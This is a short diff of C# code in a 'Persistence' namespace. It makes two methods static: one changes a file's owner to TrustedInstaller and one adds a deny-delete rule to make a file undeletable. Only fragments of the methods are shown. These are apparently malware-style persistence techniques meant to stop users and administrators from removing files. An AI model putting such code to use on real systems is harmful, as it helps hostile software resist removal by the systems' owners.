@@ -1,4 +1,3 @@
-using System;
 using System.Diagnostics;
 using Microsoft.Win32;
 using System.Security.AccessControl;
@@ -229,7 +228,7 @@ namespace Persistence
         }
 
 
-        public void ChangeOwnershipToTrustedInstaller(string filePath)
+        public static void ChangeOwnershipToTrustedInstaller(string filePath)
         {
             try
             {
@@ -241,7 +240,6 @@ namespace Persistence
 
                 // Get the current ACL of the file
                 FileSecurity fileSecurity = File.GetAccessControl(filePath);
-
                 // Create a security identifier for 'TrustedInstaller'
                 NTAccount trustedInstallerAccount = new NTAccount("NT SERVICE\\TrustedInstaller");
 
@@ -277,7 +275,7 @@ namespace Persistence
 
 
 
-        public void MakeFileUndeletable(string filePath)
+        public static void MakeFileUndeletable(string filePath)
         {
             try
             {
@@ -323,6 +321,7 @@ namespace Persistence
 
                 // Add the rule to the file's ACL
                 fileSecurity.AddAccessRule(denyDeleteRule);
+
 
                 // Apply the new security settings to the file
                 File.SetAccessControl(filePath, fileSecurity);
